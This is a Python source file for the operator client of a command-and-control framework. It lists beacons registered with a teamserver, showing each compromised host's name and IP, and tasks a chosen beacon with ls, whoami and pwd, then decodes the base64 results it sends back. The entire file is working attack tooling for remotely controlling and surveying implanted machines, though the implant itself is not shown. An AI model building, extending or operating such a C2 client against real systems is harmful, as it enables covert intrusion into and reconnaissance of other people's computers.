import requests
import time
import sys
import base64
import json
from dataclasses import dataclass


@dataclass
class Agent:
    IP: str
    Hostname: str
    Sleep: str
    UID: str


@dataclass
class CommandData:
    CommandID: str
    Command: str


@dataclass
class Client:
    Agent_List: list[Agent]
    AgentID: str = ""
    AgentHostname: str = ""
    AgentIP: str = ""
    Tasks: list[str] = None
    Beacon_Sleep: str = ""
    Teamserver: str = ""

    @classmethod
    def get_agents(cls, URL: str):
        try:
            URL = URL + "/agents"
            response = requests.get(URL)
            if response.status_code == 200:
                return response.json()["agents"]
        except Exception as e:
            print(e)

    def refresh_agents(self):
        self.Agent_List = self.get_agents(self.Teamserver)

    def send_task(self, task: str):
        try:
            URL = self.Teamserver + "/tasks/" + self.AgentID
            data = {
                "CommandID": "",
                "Command": task,
            }
            response = requests.post(URL, json=data)
            if response.status_code == 200:
                return response.json()
        except Exception as e:
            print(e)

    def get_results(self):
        try:
            URL = self.Teamserver + "/results/" + self.Tasks
            response = requests.get(URL)
            if response.status_code == 200:
                return response.json()
        except Exception as e:
            print(e)

    def __init__(self, TEAMSERVER: str):
        self.Agent_List = self.get_agents(TEAMSERVER)
        self.Teamserver = TEAMSERVER

    def display_agents(self):
        if len(self.Agent_List) == 0:
            print("[!] No agents registered")
            return

        for num, agent in enumerate(self.Agent_List, start=1):
            print(f"{num}. {agent['Hostname']}@{agent['IP']} | {agent['UID']}")

    def choose_agent(self, num):
        self.AgentID = self.Agent_List[num]["UID"]
        self.Beacon_Sleep = self.Agent_List[num]["Sleep"]
        self.AgentHostname = self.Agent_List[num]["Hostname"]
        self.AgentIP = self.Agent_List[num]["IP"]

    def reset_agent(self):
        self.AgentID = ""
        self.Beacon_Sleep = ""
        self.AgentHostname = ""
        self.AgentIP = ""

def beacon_called_home(client: Client, size: bytes):
    print(f"[*] {client.AgentHostname} called home, sent: {size} bytes")

def pretty_print_files(files):
    max_filename_len = max(len(file['Filename']) for file in files)
    
    print("\n")
    for file in files:

        file_name = file["Filename"].split("\\")[-1]

        size_in_kb = file["Size"] / 1024
        if file["IsDir"]:
            file_type = "Directory"
        else:
            file_type = "File"

        padding_width = max_filename_len - len(file_name)

        print(f"{file_name}{' ' * padding_width}\t{size_in_kb:.2f}KB\t{file_type}")
    
    print("\n")

def _beacon_print(client: Client, task_response: dict):
    response_size = sys.getsizeof(task_response)

    beacon_called_home(client, response_size)

    print(f'''
{base64.b64decode(task_response["results"][0]["Result"]).decode()}
    ''')

if __name__ == "__main__":
    client = Client("http://127.0.0.1:80")
    while True:
        client.refresh_agents()
        client.display_agents()
        beacon_id = input("> ")

        if beacon_id == "exit":
            break

        elif beacon_id.isdigit():
            beacon_id = int(beacon_id)
            if beacon_id > len(client.Agent_List):
                print("[!] Invalid agent ID")
                continue
            else:
                client.choose_agent(beacon_id - 1)
                print(
                    f"[*] Interacting with {client.AgentHostname}@{client.AgentIP} | {client.AgentID} (sleep: {client.Beacon_Sleep})"
                )

                while True:
                    task = input(f"beacon> ")
                    if task == "!":
                        break

                    match task:
                        case "ls":
                            task_request = client.send_task(task)
                            client.Tasks = task_request["uid"]

                            print("[*] Waiting for beacon...")

                            time.sleep(int(client.Beacon_Sleep) + 2)

                            task_response = client.get_results()
                            response_size = sys.getsizeof(task_response)

                            beacon_called_home(client, response_size)

                            files = json.loads(base64.b64decode(task_response["results"][0]["Result"]).decode())
                            pretty_print_files(files)
                        case "whoami":
                            task_request = client.send_task(task)
                            client.Tasks = task_request["uid"]

                            print("[*] Waiting for beacon...")

                            time.sleep(int(client.Beacon_Sleep) + 2)

                            task_response = client.get_results()
                            response_size = sys.getsizeof(task_response)


                            _beacon_print(client, task_response)
                        
                        case "pwd":
                            task_request = client.send_task(task)
                            client.Tasks = task_request["uid"]

                            print("[*] Waiting for beacon...")

                            time.sleep(int(client.Beacon_Sleep) + 2)

                            task_response = client.get_results()
                            response_size = sys.getsizeof(task_response)


                            _beacon_print(client, task_response)

                        case _:
                            print("[!] Invalid command")
                            continue

        else:
            print("[!] Invalid agent ID")
            continue
